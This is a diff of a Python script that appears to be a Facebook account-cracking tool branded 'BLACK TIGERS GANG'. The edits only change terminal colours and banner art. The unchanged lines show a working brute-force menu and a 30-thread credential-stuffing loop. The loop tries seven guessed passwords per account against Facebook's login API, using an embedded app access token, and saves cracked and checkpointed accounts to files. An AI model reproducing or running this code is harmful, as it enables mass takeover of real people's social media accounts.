@@ -53,9 +53,9 @@ logo = """
 \033[1;33m══════════██─▄─▄██─▀─███─█▄▀─███─▀─██   BLACK TIGERS GANG ═ 🔥
 \033[1;35m══════════▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀   AAHIL UPDATE 2.0.3 ═🔥
 \033[0;39m╔════════════════════════════════════════════╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;36mGitHub  \033[1;36m : \033[1;31m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;36mWhatsApp \033[1;36m: \033[1;31m0308-7861-7861\033[0;31m║
+\033[0;39m║\033[0;33m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mGitHub  \033[1;33m : \033[1;34m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
+\033[0;39m║\033[0;32m* \033[0;36mWhatsApp \033[1;32m: \033[1;38m0308-7861-7861\033[0;31m║
 \033[0;34m╚════════════════════════════════════════════╝"""
 
 def tik():
@@ -228,11 +228,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40mHack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40mHack From Public ID"
-	print "\x1b[1;32;40m[3] \033[1;33;40mTarget The Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40mHack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40mBack"
+	print "\x1b[1;32;40m[1] \033[1;33;40m═════Hack From Friend List"
+	print "\x1b[1;32;40m[2] \033[1;33;41m═════Hack From Public ID"
+	print "\x1b[1;32;40m[3] \033[1;33;40m═════Target The Bruteforce"
+	print "\x1b[1;32;40m[4] \033[1;33;45m═════Hack From File"
+	print "\x1b[1;32;40m[0] \033[1;33;43m═════Back"
 	pilih_super()
 
 def pilih_super():
@@ -295,10 +295,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;93mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;39;40m⚔════════════════════════☠════════════════════════⚔"
+	print "   \033[1;36;39m⚔════════════════════════☠════════════════════════⚔"
 
 	jalan('    \033[1;93mStart The Cloning Wait...')
-	print     "\033[1;36;39m ⚔════════════════════════☠════════════════════════⚔" 
+	print "   \033[1;36;39m⚔════════════════════════☠════════════════════════⚔" 
 
 	def main(arg):
 		global cekpoint,oks
@@ -314,7 +314,7 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' >> ' + b['name']
+				print '\x1b[1;91m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' >> ' + b['name']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
@@ -328,11 +328,11 @@ def pilih_super():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['name']
+						print '\x1b[1;98m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['name']
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['name']
+							print '\x1b[1;36;41m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['name']
 							cek = open("out/CP.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -342,7 +342,7 @@ def pilih_super():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['name']
+								print '\x1b[1;94m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['name']
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
@@ -356,7 +356,7 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['name']
+										print '\x1b[1;98m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['name']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
@@ -370,7 +370,7 @@ def pilih_super():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' >> ' + b['name']
+												print '\x1b[1;93m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' >> ' + b['name']
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
@@ -384,7 +384,7 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' >> ' + b['name']
+														print '\x1b[1;98m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' >> ' + b['name']
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -398,7 +398,7 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' >> ' + b['name']
+																print '\x1b[1;95m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' >> ' + b['name']
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
@@ -413,13 +413,13 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id) 
 	
-	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
-	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
-	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
+	print '\033[1;31;41m[✓] Process Has Been Completed\033[1;96m....'
+	print "\033[1;32;46m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
+	print '\033[1;34;48m[+] CP File Has Been Saved : save/cp.txt'
 	print """
 
 
-\033[1;31;40m ●════════════════════════◄►════════════════════════●
+\033[1;31;40m 🔥════════════════════════🙈════════════════════════🔥
            """
 	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 	super()
